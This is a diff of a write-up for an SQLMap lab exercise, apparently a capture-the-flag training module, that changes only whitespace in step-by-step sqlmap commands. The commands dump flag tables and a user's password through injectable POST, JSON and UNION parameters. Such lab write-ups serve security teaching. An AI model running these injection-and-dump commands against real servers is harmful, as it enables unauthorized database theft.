@@ -36,19 +36,21 @@ There is an 'id' parameter that is used to retrive rows of a table from a databa
 This indicates it is a POST request. This might help us in writing the command.
 
     sqlmap  'http://SERVERIP:PORT/case2.php' --data='id=*1' --batch --dump -T flag2
+    
 
 From the command:
 
 
-  `--data - speecifies that the HTTP data provided should be sent in a POST request.`
+`--data - speecifies that the HTTP data provided should be sent in a POST request.`
 
-  `id=*1 - This is the parameter of interest. The asterisk is a custom injection marker.`
+`id=*1 - This is the parameter of interest. The asterisk is a custom injection marker.`
 
-  `--batch - allows the running of the command without any user input.`
+`--batch - allows the running of the command without any user input.`
 
-  `--dump - displays data from a specified database table`
+`--dump - displays data from a specified database table`
 
-  `-T - specifies database table.`
+`-T - specifies database table.`
+
 
 
 `2. What's the contents of table flag3? (Case #3)`
@@ -78,6 +80,7 @@ We will use Burpsuite for this.
 While it is applicable in this lab, we may also use the following command.
 
     sqlmap -u 'http://SERVERIP:PORT/case4.php'  --data={'"id":1'} --batch --dump  -T flag4
+    
 
 # Attack Tuning
 
@@ -103,6 +106,7 @@ From the command:
   `--dbs - The database in question.`
   `--dbms - The underlying Database schema being used.`
 
+
 `2. What's the contents of table flag6? (Case #6)`
 
 The challenge has a vulnerable parameter col. This challenge requires the use of the prefix flag.
@@ -112,6 +116,7 @@ The challenge has a vulnerable parameter col. This challenge requires the use of
 From the command:
 
   `--prefix -  used to specify a prefix that will be added to the payloads sent by SQLmap during its testing process`
+  
 
 `3. What's the contents of table flag7? (Case #7)`
 
@@ -122,6 +127,7 @@ The challenge has a vulnerable parameter at id and it is vulnerable using a UNIO
 From the Command:
 
   `--union-col=5 - From the provided exercise we can manually count the columns in the table, so we include that in the command`
+  
 
 # Database Enumeration
 
@@ -134,6 +140,7 @@ Questions
 This challenge requires to know the names of the Database containing the table in question and the Database schema type being used
 
     sqlmap -u 'http://SERVERIP:PORT/case1.php?id=1' -T flag1 --dump --batch --risk 3 --level 5 --dbms MYSQL -D testdb
+    
 
 # Advanced Database Enumeration
 
@@ -148,6 +155,7 @@ After looking into the sqlmap manual page we should now know what flag to use in
 From the command: 
 
   `search -C - Used to search for databases, tables, and columns of interest. The -C flag represents columns.`
+  
 
 `2. What's the Kimberly user's password? (Case #1)`
 
@@ -156,6 +164,7 @@ From the command:
  From the command:
 
   `column - Lists the columns specified`
+  
 
 # Bypassing Web Application Protections
 
